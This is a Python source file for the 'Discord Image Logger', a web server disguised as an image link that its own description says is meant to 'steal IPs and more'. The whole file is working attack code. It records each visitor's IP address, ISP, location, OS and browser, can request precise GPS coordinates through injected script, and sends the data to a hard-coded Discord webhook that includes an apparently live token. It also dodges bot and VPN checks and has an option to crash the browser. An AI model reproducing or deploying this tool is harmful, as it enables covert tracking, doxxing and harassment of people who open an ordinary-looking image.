# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1158568970782253057/xEQr2eSgN72V8nBCELWg0MzgSsoIWlU0KRXy2l46JRFx-78cMDwNP96xLVZ6_ADJMGq8",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
